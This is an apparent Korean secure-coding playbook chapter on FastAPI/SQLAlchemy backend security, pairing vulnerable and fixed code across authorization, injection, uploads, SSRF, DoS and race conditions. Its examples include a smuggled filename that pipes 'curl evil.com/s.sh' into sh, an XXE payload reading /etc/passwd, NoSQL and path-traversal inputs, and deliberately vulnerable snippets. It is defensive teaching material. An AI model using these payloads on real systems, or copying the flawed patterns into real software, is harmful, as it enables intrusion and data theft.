# 웹 백엔드 보안 — 코드 레벨 (PLAYBOOK §24)

> 웹 프레임워크로 백엔드를 작성·리뷰할 때 반드시 확인해야 하는 항목.
> 예시 코드는 FastAPI/Starlette/SQLAlchemy 기준이지만, 원리는 프레임워크 무관.
>
> **전제: 파이썬과 FastAPI는 아래 항목 중 어느 것도 기본으로 막아주지 않는다.**
> Starlette은 바디 크기 제한이 없고, `re`는 타임아웃이 없고, uvicorn은 slowloris 방어가 약하다.
> 전부 명시적으로 설정해야 한다.
>
> 설정·인프라·운영 쪽(보안 헤더, 개인정보, 공급망, 백업)은 `security-ops.md`에 있다.

## 목차

- §0 핵심 원칙 4가지 + 작업 우선순위
- §1 권한/인가 — IDOR/BOLA, 기본 거부, mass assignment
- §2 인증 — 비밀번호·세션, 계정 복구, JWT, OAuth, MFA, 계정 열거
- §3 인젝션 — SQL, NoSQL, 커맨드, SSTI, XXE, CRLF, 역직렬화, ReDoS
- §4 파일 업로드 — 바디 크기, 압축 폭탄, 저장·서빙, path traversal, zip slip
- §5 HTTP 프로토콜 — Host 헤더, 프록시 헤더, open redirect, SSRF, CORS, CSRF, smuggling
- §6 DoS/가용성 — slowloris, 이벤트 루프 블로킹, 커넥션 풀, 타임아웃, 쿼리 제한
- §7 동시성/비즈니스 로직 — race condition, 멱등성, 금액 처리
- §8 클라이언트/프론트 — XSS, WebSocket, GraphQL
- 부록 A 리뷰 시 빠르게 훑는 체크리스트
- 부록 B "프레임워크가 해주겠지"라고 오해하기 쉬운 것들

---

## §0. 핵심 원칙 4가지

작업 중 판단이 애매하면 이 4개로 되돌아온다.

1. **입력을 타입으로 못박는다** — Pydantic strict 스키마 + `extra="forbid"`.
   NoSQL 인젝션, mass assignment, 상당수 인젝션이 여기서 걸린다.
2. **데이터와 코드를 절대 섞지 않는다** — 파라미터 바인딩, `shell=False`,
   템플릿 분리, `safe_load`. 인젝션 전체의 근본 원인.
3. **모든 접근에 소유권/권한 조건을 건다** — 그리고 미들웨어·의존성으로 강제해서
   개별 핸들러에서 빼먹을 수 없게 만든다.
4. **불변 조건을 DB에 박는다** — UNIQUE, CHECK, 원자적 UPDATE.
   앱 로직 검사는 동시성 상황에서 무너진다.

### 작업 우선순위

실제 사고 비중 순서. 시간이 없으면 위에서부터 처리한다.

1. 권한 검사 누락 (IDOR/BOLA) — §1
2. 인증 견고화, 특히 계정 복구 경로 — §2
3. 인젝션 계열 — §3
4. 가용성 (커넥션 풀, 타임아웃, 크기 제한) — §6
5. 보안 헤더, 그 외 — `security-ops.md §9`

> SQL 인젝션은 ORM 사용 시 대부분 사라진다. OWASP API Top 10 **2019판**에서 인젝션은
> 이미 8위(API8:2019)였고, **2023판에서는 독립 항목에서 빠졌다.** 반대로 권한은 2023판에서
> API1(객체)·API3(속성)·API5(함수) 세 자리를 차지한다. **권한 검사부터 본다.**
> 근거: `refs/research/2026-09-05-owasp-api-top10.md`

---

## §1. 권한/인가 (최우선)

### §1.1 IDOR / BOLA — 소유권 검사 누락

```python
# ❌ 로그인만 확인하고 "이게 이 사용자 것인지"는 확인하지 않음
@app.get("/orders/{order_id}")
def get_order(order_id: int, user = Depends(current_user)):
    return db.get(Order, order_id)   # id를 1,2,3... 순회하면 전부 조회됨
```

```python
# ✅ 소유권을 쿼리 조건에 포함
order = db.scalar(
    select(Order).where(Order.id == order_id, Order.user_id == user.id)
)
if not order:
    raise HTTPException(404)   # 403이 아니라 404 (존재 여부도 정보다)
```

**원칙: "조회 후 검사"가 아니라 "조건에 포함".**
검사 방식은 엔드포인트 하나만 빼먹어도 그대로 구멍이 된다.
UUID 사용은 완화책이지 해결책이 아니다 (URL은 로그·리퍼러로 샌다).

### §1.2 권한 검사를 구조로 강제 (기본 거부)

```python
# 라우터 단위로 강제
admin = APIRouter(prefix="/admin", dependencies=[Depends(require_role("admin"))])

# 리소스 접근은 의존성으로 통일 — 핸들러가 객체를 못 받으면 아예 진입 불가
async def owned_order(order_id: int, user=Depends(current_user), db=...) -> Order:
    o = await db.scalar(
        select(Order).where(Order.id == order_id, Order.user_id == user.id)
    )
    if not o:
        raise HTTPException(404)
    return o

@app.get("/orders/{order_id}")
async def get(order: Order = Depends(owned_order)):
    return order
```

- 함수 레벨 권한(`/admin/*`)을 각 핸들러에 흩어놓으면 반드시 하나 빠진다.
  라우터에 `dependencies=[...]`로 묶는다.
- **멀티테넌트**: `tenant_id`를 모든 쿼리에 자동 주입하는 레이어를 만든다.
  손으로 붙이면 반드시 빠진다. Postgres면 RLS(Row Level Security)로
  DB에 박는 것이 가장 확실하다.

### §1.3 Mass Assignment / 과도한 데이터 노출

Pydantic을 쓴다고 안전한 게 아니라, **입력용/출력용 모델을 분리했는지**의 문제다.

```python
# ❌ DB 모델을 그대로 입력에 사용 → is_admin, balance까지 받아버림
@app.post("/users")
def create(data: UserTable): ...
```

```python
# ✅ 입출력 스키마 분리
class UserCreate(BaseModel):
    model_config = ConfigDict(extra="forbid")   # 모르는 필드는 422
    email: EmailStr
    password: str

class UserOut(BaseModel):        # password_hash는 절대 나가지 않음
    id: int
    email: str

@app.post("/users", response_model=UserOut)
def create(data: UserCreate): ...
```

**`response_model`을 반드시 건다.** 안 걸면 ORM 객체가 직렬화되면서
해시·토큰이 응답에 그대로 실린다.

---

## §2. 인증

### §2.1 비밀번호 / 세션

- 해싱은 **bcrypt(cost 12+) 또는 Argon2id**. `sha256 + salt` 금지.
- 로그인 성공 시 세션 ID 재발급 (세션 고정 공격 방어).
- 로그인/비번재설정/OTP 엔드포인트는 **IP + 계정 양쪽으로** 레이트리밋
  (크리덴셜 스터핑 방어).
- 민감 작업(비번 변경, 결제수단 추가, 이메일 변경)에는 **재인증** 요구.
- 사용자에게 활성 세션 목록 + 원격 로그아웃 제공. 새 기기/새 지역 로그인 알림.

> 이 저장소의 JWT/세션 구현 규약(`jtt`/`rjti`/`fjti`, Redis 세션 키, fresh token)은
> `auth-jwt.md`에 있다. 이 절은 그 위에 얹는 일반 보안 요구사항이다.

### §2.2 계정 복구 — 가장 약한 고리

비밀번호를 아무리 강하게 해도 **재설정 경로가 뚫리면 끝난다.**

- 토큰은 `secrets.token_urlsafe(32)`.
- **DB에는 해시로 저장** (DB가 털려도 사용 불가).
- 15~30분 만료, 1회용.
- 재설정 완료 시 **기존 세션 전부 무효화**.
- 이메일 변경 시 **기존 주소에도 알림** — 탈취 감지의 마지막 방어선.
- 재설정 링크 생성 시 **요청 Host 헤더를 쓰지 않는다** (§5.1).

### §2.3 JWT

| 공격 | 방어 |
|---|---|
| `alg: none` | `algorithms=["RS256"]` 명시 |
| HS/RS 혼동 (공개키를 HMAC 키로) | 알고리즘 화이트리스트 |
| `kid`로 path traversal/SQLi | kid를 파일경로·쿼리에 쓰지 않음 |
| `jku`/`x5u`로 공격자 키 지정 | 해당 클레임 무시 |
| 만료 무시 | `exp`, `nbf`, `iss`, `aud` 전부 검증 |
| 로그아웃 후에도 유효 | 짧은 만료 + 리프레시 회전 + jti 블랙리스트 |

```python
jwt.decode(token, PUBLIC_KEY, algorithms=["RS256"],
           audience="api.example.com", issuer="https://auth.example.com",
           options={"require": ["exp", "iat", "sub"]})
```

- JWT는 취소가 안 된다 → 액세스 15분 + 리프레시 토큰(DB 저장, 회전, 재사용 감지).
- **토큰을 `localStorage`에 넣지 않는다.** XSS 한 번에 털린다.
  → `HttpOnly; Secure; SameSite=Lax` 쿠키.

> 주의: 이 저장소의 기존 규약(§20.2, `frontend.md`)은 access token을 `sessionStorage`,
> refresh token을 `localStorage`에 둔다. 위 권고와 충돌한다.
> **새 프로젝트라면 HttpOnly 쿠키를 우선 검토하고, 기존 프로젝트는 규약을 유지하되
> XSS 방어(§8.1)를 그만큼 더 엄격하게 본다.** 어느 쪽을 택했는지 사용자에게 확인한다.

### §2.4 OAuth / 소셜 로그인

- `state` 파라미터 필수 (CSRF). 세션에 저장 후 대조.
- PKCE 사용 (public client면 필수).
- `redirect_uri`는 **정확히 일치** 검증. prefix 매칭하면 `https://ok.com.evil.com` 통과.
- **이메일 기반 계정 병합 주의**: 공급자의 `email_verified`를 확인하지 않으면
  남의 계정을 탈취할 수 있다.

### §2.5 MFA

- TOTP 시크릿은 암호화 저장, 백업코드는 해시로.
- 사용한 코드 재사용 방지 (사용 이력 기록).
- **MFA 우회 경로 점검**: 레거시 API, 리멤버미 쿠키, 계정복구가 MFA를 건너뛰는지.

### §2.6 타이밍 / 계정 열거

- 비밀번호·토큰 비교는 `secrets.compare_digest()`.
- 존재하지 않는 유저면 해싱을 건너뛰어 응답이 빨라진다
  → **더미 해시로 항상 verify를 돌려 시간을 맞춘다.**
- 에러 메시지 통일: "이메일 없음" vs "비번 틀림"을 구분하면 계정이 열거된다.
- 회원가입/비번찾기 응답도 통일: "해당 이메일로 안내를 보냈습니다".

---

## §3. 인젝션

### §3.1 SQL — ORM을 써도 뚫리는 지점

```python
# ❌ text()에 f-string
db.execute(text(f"SELECT * FROM users WHERE name = '{name}'"))

# ❌ 정렬/컬럼명 — 바인딩 파라미터로 넣을 수 없어서 실제로 가장 많이 뚫리는 곳
db.execute(text(f"SELECT * FROM posts ORDER BY {sort_col} {direction}"))

# ✅ 값은 바인딩
db.execute(text("SELECT * FROM users WHERE name = :n"), {"n": name})

# ✅ 식별자는 화이트리스트만
ALLOWED = {"created_at": Post.created_at, "views": Post.views}
col = ALLOWED.get(sort_col)
if col is None:
    raise HTTPException(400)
```

### §3.2 NoSQL 인젝션

MongoDB는 JSON이 그대로 쿼리가 된다.

```json
{"username": "admin", "password": {"$ne": null}}
```
→ 비밀번호 검사가 통째로 우회된다.

**Pydantic이 사실상 해결책.** `password: str`로 선언하면 dict가 들어올 때 422로 튕긴다.
**`Dict[str, Any]`나 `Any`로 받는 순간 구멍이 뚫린다.**

### §3.3 커맨드 인젝션

`ffmpeg`, `imagemagick`, `pdftotext` 호출 시 자주 발생.

```python
# ❌
subprocess.run(f"ffmpeg -i {filename} out.mp4", shell=True)
#    filename = "a.mp4; curl evil.com/s.sh | sh"

# ✅
subprocess.run(["/usr/bin/ffmpeg", "-i", path, out],
               shell=False, timeout=30, check=True)
```

리스트로 넘겨도 **파일명이 `-`로 시작하면 인자로 해석된다**(argument injection).
`./`를 붙이거나 `--` 구분자를 쓴다.

### §3.4 SSTI (템플릿 인젝션)

```python
Template(user_input)   # ❌ 절대 금지 — RCE까지 체인 가능
```

**규칙: 템플릿 문자열은 절대 사용자 입력에서 오지 않는다. 데이터는 변수로만.**
관리자가 이메일 템플릿을 편집하는 기능도 위험 →
`SandboxedEnvironment` + 최소 권한.

### §3.5 XXE (XML 파싱)

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
```
→ 파일 읽기 + SSRF + DoS(billion laughs).

표준 `xml.etree`는 최신 버전에서 외부 엔티티를 기본 차단하지만
**`lxml`은 설정하지 않으면 뚫린다.**

```python
from defusedxml import ElementTree   # 가장 안전
# 또는
parser = etree.XMLParser(resolve_entities=False, no_network=True, huge_tree=False)
```

**SVG 업로드도 XML이다.** SVG는 XXE와 XSS 둘 다 가능하다.

### §3.6 CRLF / 로그 인젝션

Starlette은 헤더 값의 개행을 막아주지만 **로그는 막아주지 않는다.**

```python
logger.info(f"login failed: {username}")
# username = "a\n2026-08-30 INFO login success: admin"  → 로그 위조
```
→ 개행 이스케이프 또는 JSON 구조화 로깅 사용 (`logging.md`의 structlog 설정이 이걸 만족한다).
이메일도 같은 원리로 `To`/`Subject`에 개행을 넣어 BCC를 추가하는 공격이 있다.

### §3.7 코드 실행 계열 (한 번에 서버 장악)

- `pickle.loads()` — 신뢰할 수 없는 데이터면 **즉시 RCE**.
  세션·캐시·큐 페이로드에 pickle을 쓰는 것이 대표적 사고 유형.
- `yaml.load()` → **반드시** `yaml.safe_load()`.
- `torch.load()`, `joblib.load()` — 내부가 pickle이다.
  **인터넷에서 받은 ML 모델 로드도 RCE 벡터.** `weights_only=True` 또는 safetensors.
- `eval` / `exec` / `subprocess(shell=True)`.

### §3.8 ReDoS (정규식 DoS)

**파이썬 `re`는 Java와 동일한 백트래킹 엔진이다. 오히려 타임아웃이 없어서 더 나쁘다.**
`(a+)+$` 같은 패턴에 긴 입력을 주면 지수 시간으로 CPU가 포화된다.
실측(`refs/redos-lab/`): 입력 한 글자마다 시간이 두 배 — 28자 5초, 31자 40초. 코어 하나가 통째로 묶인다.

대응(위에서부터 권장):

```python
# (a) google-re2 — 유한오토마타 기반, 백트래킹 자체가 없어 항상 선형시간
import re2
re2.search(r"(a+)+$", evil)
# 단점: lookahead/backreference 미지원 (입력 검증용에는 보통 불필요)

# (b) regex 모듈 — 타임아웃 지원
import regex
regex.search(pattern, s, timeout=0.2)
```

```python
# (c) Pydantic v2는 이미 안전하다 — 기본 엔진이 Rust regex(선형시간)
class Model(BaseModel):
    model_config = ConfigDict(regex_engine="rust-regex")  # 기본값
    email: str = Field(pattern=r"^[\w.]+@[\w.]+$")
```

> **`regex_engine="python-re"`로 바꾸지 않는다.**
> lookahead를 쓰려고 바꾸는 순간 ReDoS 구멍이 다시 뚫린다.

무엇을 쓰든:
- 정규식 실행 **전에 입력 길이를 자른다** (`if len(s) > 256: reject`). 가장 싸고 효과적.
- `(x+)+`, `(x|x)*`, `(.*a){10}` 같은 중첩 수량자를 리뷰에서 잡는다.
- 사용자가 정규식 자체를 입력하는 기능이면 무조건 re2.

---

## §4. 파일 업로드 / 역직렬화

### §4.1 바디 크기 제한

`UploadFile`은 `SpooledTemporaryFile`이라 1MB를 넘으면 **디스크에 쓴다.**
크기 제한이 없으면 `/tmp`가 포화된다.

**`Content-Length`를 믿으면 안 된다** (chunked encoding으로 거짓말 가능).
실제 읽은 바이트를 센다.

```python
class BodyTooLarge(Exception): pass

class MaxBodySizeMiddleware:
    def __init__(self, app, max_size=10 * 1024 * 1024):
        self.app, self.max_size = app, max_size

    async def __call__(self, scope, receive, send):
        if scope["type"] != "http":
            return await self.app(scope, receive, send)

        total = 0
        async def limited_receive():
            nonlocal total
            msg = await receive()
            if msg["type"] == "http.request":
                total += len(msg.get("body", b""))
                if total > self.max_size:
                    raise BodyTooLarge()
            return msg

        try:
            await self.app(scope, limited_receive, send)
        except BodyTooLarge:
            await send({"type": "http.response.start", "status": 413, "headers": []})
            await send({"type": "http.response.body", "body": b"too large"})
```

> **`BaseHTTPMiddleware`가 아니라 순수 ASGI로 작성한다.**
> `BaseHTTPMiddleware`는 바디를 버퍼링해서 제한이 무의미해진다.
> 바로 쓸 수 있는 최소 구현: `refs/asgi-body-limit/max_body_size.py`

### §4.2 이미지 압축 폭탄 / 메타데이터

3KB짜리 PNG가 디코딩되면 50000×50000 = 100억 픽셀 → RAM 수십 GB.

```python
import warnings
from PIL import Image

Image.MAX_IMAGE_PIXELS = 50_000_000
warnings.simplefilter("error", Image.DecompressionBombWarning)

def safe_open(fp):
    img = Image.open(fp)          # 헤더만 읽음 (lazy)
    w, h = img.size               # load() 전에 크기부터 검사
    if w * h > 50_000_000 or w > 20000 or h > 20000:
        raise ValueError("bomb suspected")
    img.load()                    # 여기서 실제 디코딩
    return img
```

**핵심: `Image.open()`은 lazy다. `.load()`/`.convert()` 전에 `.size`를 먼저 검사하면
디코딩 없이 폭탄을 거를 수 있다.**

- 확장자·`Content-Type`을 믿지 않는다. `python-magic` / `filetype`으로 매직바이트 검증.
- EXIF 폭탄(수십 MB 메타데이터)은 `img.getdata()`로 픽셀만 재인코딩해
  메타데이터를 통째로 제거하는 것이 가장 깔끔하다.
  (동시에 사진의 GPS 좌표 유출도 막힌다.)
- `/tmp`를 별도 볼륨으로 분리하거나 quota를 건다.
  디스크가 차면 DB도 로그도 전부 죽는다.

### §4.3 저장 / 서빙

- **사용자가 준 파일명을 절대 쓰지 않는다.**
  `../../etc/passwd`, `..\\`, 널바이트가 들어온다.
  → `uuid4().hex + 검증된 확장자`로 새로 만든다.
- 업로드 디렉터리는 **웹 루트 밖에** 둔다.
- 서빙 시 `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff`
  (`security-ops.md §9`). 안 하면 업로드된 HTML이 내 도메인에서 실행되어 저장형 XSS가 된다.

### §4.4 Path Traversal (다운로드)

```python
# ❌
FileResponse(f"./uploads/{name}")   # name="../../.env"

# ✅
base = Path("./uploads").resolve()
target = (base / name).resolve()
if not target.is_relative_to(base) or not target.is_file():
    raise HTTPException(404)
```

`%2e%2e%2f`, `..%c0%af`, 널바이트, 유니코드 정규화 우회가 전부 존재한다.
**문자열 필터링이 아니라 `resolve()` 후 경로 비교로 해결한다.**
`StaticFiles`로 마운트한 디렉터리에 `.env`나 백업 파일이 없는지 확인한다.

### §4.5 Zip Slip / 압축 폭탄

```python
base = Path("/data/extract").resolve()
for m in zf.infolist():
    dest = (base / m.filename).resolve()
    if not dest.is_relative_to(base):        # 심볼릭 링크도 resolve로 잡힘
        raise ValueError("zip slip")
    if m.file_size > 50 * 1024**2:           # 압축 해제 후 크기 (42.zip 대비)
        raise ValueError("bomb")
```

`file_size` 합계와 압축비(`file_size / compress_size`)도 함께 본다. 100배가 넘으면 의심.

---

## §5. HTTP 프로토콜 레벨

### §5.1 Host 헤더 인젝션

```python
# ❌ 비번 재설정 링크를 요청 Host로 생성
link = f"https://{request.headers['host']}/reset?token={t}"
# 공격자가 Host: evil.com을 보내면 토큰이 공격자에게 배달된다
```

**설정에 박힌 도메인만 사용한다.**

```python
app.add_middleware(TrustedHostMiddleware, allowed_hosts=["api.example.com"])
```
nginx에서도 알 수 없는 Host는 444로 끊는다.

### §5.2 프록시 헤더 위조

```python
ip = request.headers["X-Forwarded-For"]   # ❌ 클라이언트가 마음대로 설정 가능
```

레이트리밋을 이걸로 하면 헤더만 바꿔서 무한 우회된다.
신뢰하는 프록시 뒤에서만 사용하고 소스를 제한한다:

```bash
uvicorn app:app --proxy-headers --forwarded-allow-ips="10.0.0.1"
```
XFF는 **가장 오른쪽부터** 신뢰 홉 수만큼 세는 것이 맞다.

### §5.3 Open Redirect

```python
# ❌ 로그인 후 next 파라미터를 그대로 사용
return RedirectResponse(next_url)   # next=//evil.com

# ✅ 상대경로만 허용
if not next_url.startswith("/") or next_url.startswith("//"):
    next_url = "/"
```
`//evil.com`, `/\evil.com`, `https:/evil.com`이 전부 우회 케이스다.

### §5.4 SSRF

"URL을 입력받아 서버가 fetch"하는 기능이 있으면 반드시 처리한다.
웹훅, 이미지 URL 임포트, 링크 미리보기 전부 해당.

```python
ip = ipaddress.ip_address(socket.gethostbyname(host))
if ip.is_private or ip.is_loopback or ip.is_link_local:
    raise HTTPException(400)
```

- **`169.254.169.254`(클라우드 메타데이터) 차단이 핵심.**
  IAM 크리덴셜이 통째로 털린다. AWS는 **IMDSv2 강제**로 추가 방어.
- **리다이렉트 추적을 끄고**(`follow_redirects=False`) 매 홉마다 재검증한다.
  안 하면 DNS 리바인딩으로 우회된다.

### §5.5 CORS

```python
# ❌ 이 조합은 브라우저가 거부하거나, 되게 만들면 전면 개방
allow_origins=["*"], allow_credentials=True
```

- 와일드카드 대신 도메인 명시 (§19.10, `auth-jwt.md` — origins는 환경 변수로).
- `allow_origin_regex`를 쓸 거면 `\.example\.com$`처럼 **끝 앵커**를 반드시 넣는다.
  없으면 `example.com.evil.com`이 통과한다.

### §5.6 CSRF

쿠키 인증이면 필요, `Authorization` 헤더 방식이면 불필요.
FastAPI에 내장이 없어 직접 구현해야 한다.
`SameSite=Lax`가 1차 방어, 상태 변경에는 더블 서밋 토큰 + `Origin` 헤더 검증.

### §5.7 Request Smuggling / 캐시 오염

- **Smuggling**: 프론트(nginx)와 백(uvicorn)이 `Content-Length` vs `Transfer-Encoding`을
  다르게 해석하면 숨긴 요청이 **다른 사용자 요청 앞에 붙는다** → 인증 우회, 세션 탈취.
  앱에서 못 막는다. → 프론트-백 간 연결 재사용 끄기, 최신 버전 유지,
  애매한 요청은 프론트에서 거부.
- **캐시 오염**: 캐시 키에 없는 헤더가 응답에 반영되면 오염된 응답이 전체에 배포된다.
- **캐시 기만**: `/account.json` 같은 확장자를 붙여 CDN이 개인정보를
  정적 파일로 캐싱하게 만든다.
  → 개인화 응답에 `Cache-Control: private, no-store` 명시, `Vary` 정확히 설정.

---

## §6. DoS / 가용성

### §6.1 연결 폭주 / Slowloris

**앱에서 풀려고 하지 않는다.** 요청이 앱에 도달한 시점에 이미 소켓·워커는 소비됐다.
앞단에서 자른다.

```nginx
client_max_body_size 10m;
client_header_timeout 10s;   # 헤더 천천히 보내기 차단
client_body_timeout 10s;     # 바디 천천히 보내기 차단
send_timeout 10s;

limit_conn_zone $binary_remote_addr zone=perip:10m;
limit_req_zone  $binary_remote_addr zone=reqs:10m rate=20r/s;

server {
    limit_conn perip 20;
    limit_req  zone=reqs burst=40 nodelay;
}
```

```bash
uvicorn app:app --limit-concurrency 200 --timeout-keep-alive 5 --backlog 2048
```

앱 레벨 레이트리밋(`slowapi` + Redis)은 부가적으로만.
L3/L4 볼륨 공격은 CDN/WAF 없이는 대응 불가.

### §6.2 FastAPI 고유 함정 — 이벤트 루프 블로킹

**`async def` 핸들러 안에서 블로킹/CPU 작업을 하면 이벤트 루프 전체가 멈춰
서버 프로세스 하나가 통째로 죽는다. 요청 1개로 전체 DoS가 가능하다.**

```python
# ❌ 이거 하나가 서버 전체를 멈춘다
@app.post("/resize")
async def bad(f: UploadFile):
    return heavy_image_processing(f.file)

# ✅ def로 선언 → 스레드풀로 자동 오프로드
@app.post("/resize")
def ok(f: UploadFile):
    return heavy_image_processing(f.file)

# ✅✅ CPU 바운드는 프로세스풀로
@app.post("/resize")
async def best(f: UploadFile):
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(process_pool, heavy, data)
```

스레드풀도 기본 40개로 유한하다. 무거운 작업은 Celery/RQ로 분리한다.
(같은 원리의 파이프라인 패턴은 `async-patterns.md` §23.1.)

### §6.3 커넥션 풀 고갈 — 가장 흔한 장애 원인

요청은 200개인데 DB 풀이 5개면 나머지는 전부 대기 → 타임아웃 → 리트라이 → 악화.

```python
create_async_engine(url,
    pool_size=20, max_overflow=10,
    pool_timeout=5,          # 무한 대기 금지. 빨리 실패해야 한다
    pool_recycle=1800,       # DB가 유휴 연결을 끊기 전에 재활용
    pool_pre_ping=True)      # 죽은 커넥션 감지
```

**계산: `워커수 × (pool_size + max_overflow) ≤ DB max_connections`.**
워커 4개 × 30 = 120인데 Postgres 기본이 100이면 그대로 터진다.

세션은 요청 스코프로 확실히 닫는다(`Depends` yield 패턴, `python-api.md`).
백그라운드 작업에서 요청 세션을 재사용하지 않는다.

### §6.4 타임아웃과 재시도

```python
httpx.AsyncClient(timeout=httpx.Timeout(5.0, connect=2.0))
```

- 타임아웃이 없으면 업스트림 지연 시 연결이 쌓여 자멸한다.
- **서킷 브레이커**: 실패율이 임계를 넘으면 호출 자체를 차단(fail fast).
- 재시도에는 **지수 백오프 + 지터**. 고정 간격 재시도는
  재시도 폭풍을 만들어 복구를 방해한다.

### §6.5 쿼리 / 페이로드 제한

```python
limit: int = Query(50, le=200)   # 사용자가 limit=999999를 넣지 못하게
```

- **모든 목록 API에 limit 상한을 강제한다.** `SELECT *` 한 방에 500만 행 → 메모리 폭발.
- 깊은 `offset`은 DB가 느려진다 → 커서 페이지네이션.
- N+1 쿼리 제거(`selectinload`).

### §6.6 운영 안정성

- **헬스체크 분리**: `/livez`(프로세스 생존)와 `/readyz`(의존성 정상).
  하나로 합치면 DB가 잠깐 끊길 때 컨테이너가 무한 재시작한다.
- **graceful shutdown**: SIGTERM 후 진행 중 요청을 마칠 시간을 준다.
  배포마다 에러가 나는 원인.
- cgroup 메모리 제한으로 한 프로세스가 호스트 전체를 먹지 못하게.
- **캐시 스탬피드**: 인기 키가 만료되는 순간 수천 요청이 DB로 몰린다
  → 락 또는 TTL 지터.
- 큐에도 최대 길이 제한. 무한 큐는 메모리 폭탄이자 지연 폭탄.
- 무거운 작업은 동기 처리하지 말고 큐로. 응답은 202 + 작업 ID.

---

## §7. 동시성 / 비즈니스 로직

스캐너가 잡지 못하는 영역. 금전 사고가 여기서 난다.

### §7.1 Race Condition (TOCTOU)

쿠폰이 1회용인데 동시에 100번 요청하면 100번 적용된다.
잔액 차감, 재고, 초대코드 전부 해당.

```python
# ❌ 읽기 → 판단 → 쓰기 사이에 틈이 있다
if coupon.used_count < coupon.limit:
    coupon.used_count += 1
```

```python
# ✅ (a) DB 레벨 락
row = db.scalar(select(Coupon).where(...).with_for_update())

# ✅ (b) 원자적 조건부 UPDATE — 더 낫다
res = db.execute(
    update(Coupon)
    .where(Coupon.id == cid, Coupon.used_count < Coupon.limit)
    .values(used_count=Coupon.used_count + 1)
)
if res.rowcount == 0:
    raise HTTPException(409)

# ✅ (c) UNIQUE 제약으로 아예 불가능하게 — (user_id, coupon_id)
```

잔액은 `balance = balance - :amt` + `CHECK (balance >= 0)`.

### §7.2 멱등성

결제 API에 재시도가 오면 이중 결제가 된다.
`Idempotency-Key` 헤더를 받아 UNIQUE 인덱스로 중복을 차단한다.

### §7.3 비즈니스 로직 일반

- **가격·수량을 클라이언트가 보낸 값으로 계산하지 않는다.**
  상품 ID만 받고 가격은 DB에서 조회.
- 음수 수량은 환불로 악용된다 → `Field(gt=0)`.
- 다단계 플로우(장바구니→결제→확정)에서 중간 단계를 건너뛸 수 있는지 확인.
- **금액에 부동소수점 금지** → `Decimal` 또는 정수 최소단위.

---

## §8. 클라이언트 / 프론트

### §8.1 XSS

React/Vue는 기본 이스케이프라 대부분 커버되지만 구멍은 정해져 있다:

- `dangerouslySetInnerHTML`, `v-html`
- `<a href={userInput}>` (`javascript:` 스킴)
- 마크다운 렌더링
- DOM XSS (`location.hash` → `innerHTML`)
- `postMessage` 수신 시 `event.origin` 미검증
- `window.opener` (`rel="noopener"` 필요)

사용자 HTML을 허용해야 하면 `bleach` / DOMPurify로 화이트리스트 새니타이즈.

### §8.2 WebSocket

- **Origin 헤더를 직접 검증해야 한다.** CORS가 적용되지 않고 SOP도 없어서
  Cross-Site WebSocket Hijacking이 성립한다.
- 핸드셰이크 시 한 번만 인증하고 끝내지 말고, 연결 수명 동안 권한을 재확인한다.
  (이 저장소의 WS 티켓 패턴은 §19.3, `auth-jwt.md`.)
- `websocket.receive_text()`에는 크기 제한이 없다 → 메시지 크기·빈도 제한.

### §8.3 GraphQL

REST 방어가 대부분 통하지 않는다.

- 중첩 쿼리 DoS → depth limit + complexity limit
- 배칭으로 레이트리밋 우회 → 배치 크기 제한
- introspection 프로덕션에서 비활성화
- **필드 단위 권한 검사** (엔드포인트 단위 검사가 무의미해진다)

---

## 부록 A. 리뷰 시 빠르게 훑는 체크리스트

**권한 (§1)**
- [ ] 모든 리소스 조회/수정에 소유권 조건이 쿼리에 들어가 있는가
- [ ] 관리자 라우터에 `dependencies=[Depends(require_role(...))]`가 걸려 있는가
- [ ] 멀티테넌트면 tenant_id가 자동 주입되는가

**입출력 (§1.3, §3.2, §6.5)**
- [ ] 모든 엔드포인트에 `response_model`이 있는가
- [ ] 입력 스키마에 `extra="forbid"`가 있는가
- [ ] `Any` / `Dict[str, Any]`로 받는 곳이 없는가
- [ ] 목록 API에 `Query(50, le=200)` 형태의 상한이 있는가

**인젝션 (§3)**
- [ ] `text()` + f-string, `shell=True`, `Template(user_input)`,
      `pickle.loads`, `yaml.load`가 없는가
- [ ] ORDER BY / 컬럼명이 화이트리스트로 처리되는가

**가용성 (§6)**
- [ ] `async def` 안에 블로킹/CPU 작업이 없는가
- [ ] 모든 외부 호출에 타임아웃이 있는가
- [ ] 워커수 × 풀크기 ≤ DB max_connections 인가
- [ ] 바디 크기 제한 미들웨어가 있는가

**동시성 (§7)**
- [ ] 잔액/재고/쿠폰이 원자적 UPDATE 또는 락으로 처리되는가
- [ ] 결제에 멱등성 키가 있는가

**설정 (`security-ops.md §13`)**
- [ ] 프로덕션에서 `/docs`, `debug`가 꺼져 있는가
- [ ] `TrustedHostMiddleware`가 있는가
- [ ] CORS에 와일드카드 + credentials 조합이 없는가
- [ ] 보안 헤더 미들웨어가 있는가

**운영 (`security-ops.md §11~§13`)**
- [ ] 백업이 불변이고, 복원 테스트를 한 적이 있는가
- [ ] 아웃바운드가 기본 차단인가
- [ ] 인증 실패/권한 거부가 로깅되고 알림이 있는가

---

## 부록 B. "이건 프레임워크가 해주겠지"라고 오해하기 쉬운 것들

| 오해 | 실제 |
|---|---|
| FastAPI가 바디 크기를 제한해 준다 | 제한 없음. 직접 미들웨어 작성 (§4.1) |
| Pydantic이 ReDoS를 막아준다 | v2 기본 엔진(rust-regex)만 안전. `re`는 여전히 취약 (§3.8) |
| ORM을 쓰면 SQLi가 불가능하다 | `text()` + f-string, ORDER BY 식별자는 그대로 취약 (§3.1) |
| 로그인 확인 = 권한 확인 | 별개. 소유권은 따로 검사해야 한다 (§1.1) |
| React를 쓰면 XSS가 없다 | `dangerouslySetInnerHTML`, `href` 스킴, 마크다운은 그대로 (§8.1) |
| helmet/보안헤더가 XSS를 막는다 | 2차 방어일 뿐. 이스케이프가 본체 (`security-ops.md §9`) |
| CORS가 WebSocket도 보호한다 | 적용되지 않음. Origin 직접 검증 필요 (§8.2) |
| 백업이 있으니 랜섬웨어는 괜찮다 | 백업이 먼저 삭제된다 (`security-ops.md §12`) |
| 방화벽을 설정했다 | 대개 인바운드만. 아웃바운드 차단이 실질 방어 (`security-ops.md §11.4`) |
| `pickle`은 그냥 직렬화 포맷이다 | 역직렬화 = 임의 코드 실행 (§3.7) |
